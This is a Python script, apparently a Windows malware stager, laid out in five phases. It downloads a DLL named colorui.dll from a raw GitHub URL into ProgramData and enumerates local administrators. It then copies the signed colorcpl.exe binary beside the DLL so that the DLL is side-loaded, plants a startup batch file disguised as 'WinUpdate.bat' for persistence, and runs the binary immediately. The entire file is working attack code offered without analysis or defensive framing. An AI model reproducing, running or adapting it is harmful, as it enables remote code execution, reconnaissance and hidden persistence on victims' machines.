import os
import shutil
import subprocess
import urllib.request

# ═══════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════
dll_url    = "https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/main/dll/colorui.dll"
dll_path   = r"C:\ProgramData\colorui.dll"
host_src   = r"C:\Windows\System32\colorcpl.exe"
host_dst   = r"C:\ProgramData\colorcpl.exe"
log_path   = r"C:\ProgramData\stage1.log"
bat_name   = "WinUpdate.bat"

# ═══════════════════════════════════════════════
# PHASE 1: DLL Staging (download as colorui.dll)
# ═══════════════════════════════════════════════
if os.path.exists(dll_path):
    with open(log_path, 'a') as f:
        f.write(f"[SKIP] DLL already staged at {dll_path}\n")
else:
    try:
        urllib.request.urlretrieve(dll_url, dll_path)
        with open(log_path, 'a') as f:
            f.write(f"[OK] DLL staged to {dll_path}\n")
    except Exception as e:
        with open(log_path, 'a') as f:
            f.write(f"[ERR] Download failed: {e}\n")

# ═══════════════════════════════════════════════
# PHASE 2: Local Admin Enumeration (always runs)
# ═══════════════════════════════════════════════
try:
    result = subprocess.run(
        ['net', 'localgroup', 'Administrators'],
        capture_output=True, text=True
    )
    with open(log_path, 'a') as f:
        f.write("=== Local Admin Group ===\n")
        f.write(result.stdout)
        f.write("=========================\n")
except Exception as e:
    with open(log_path, 'a') as f:
        f.write(f"[ERR] Enumeration failed: {e}\n")

# ═══════════════════════════════════════════════
# PHASE 3: Host Binary Staging (copy colorcpl.exe)
# ═══════════════════════════════════════════════
if os.path.exists(host_dst):
    with open(log_path, 'a') as f:
        f.write(f"[SKIP] Host binary already staged at {host_dst}\n")
else:
    try:
        shutil.copy2(host_src, host_dst)
        with open(log_path, 'a') as f:
            f.write(f"[OK] Host binary staged: {host_src} -> {host_dst}\n")
    except Exception as e:
        with open(log_path, 'a') as f:
            f.write(f"[ERR] Host binary copy failed: {e}\n")

# ═══════════════════════════════════════════════
# PHASE 4: Persistence (Startup .bat -> colorcpl.exe)
# ═══════════════════════════════════════════════
startup_folder = os.path.expandvars(
    r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
)
bat_path = os.path.join(startup_folder, bat_name)
bat_content = f'@echo off\n"{host_dst}"'

if os.path.exists(bat_path):
    with open(log_path, 'a') as f:
        f.write(f"[SKIP] Startup .bat already exists at {bat_path}\n")
else:
    try:
        with open(bat_path, 'w') as f:
            f.write(bat_content)
        with open(log_path, 'a') as f:
            f.write(f"[OK] Persistence established: Startup .bat -> colorcpl.exe (side-loads colorui.dll)\n")
    except Exception as e:
        with open(log_path, 'a') as f:
            f.write(f"[ERR] Startup persistence failed: {e}\n")

# ═══════════════════════════════════════════════
# PHASE 5: Trigger Side-Load (run colorcpl.exe now)
# ═══════════════════════════════════════════════
try:
    subprocess.Popen([host_dst])
    with open(log_path, 'a') as f:
        f.write(f"[OK] Side-load triggered: {host_dst} -> colorui.dll loaded\n")
except Exception as e:
    with open(log_path, 'a') as f:
        f.write(f"[ERR] Side-load trigger failed: {e}\n")
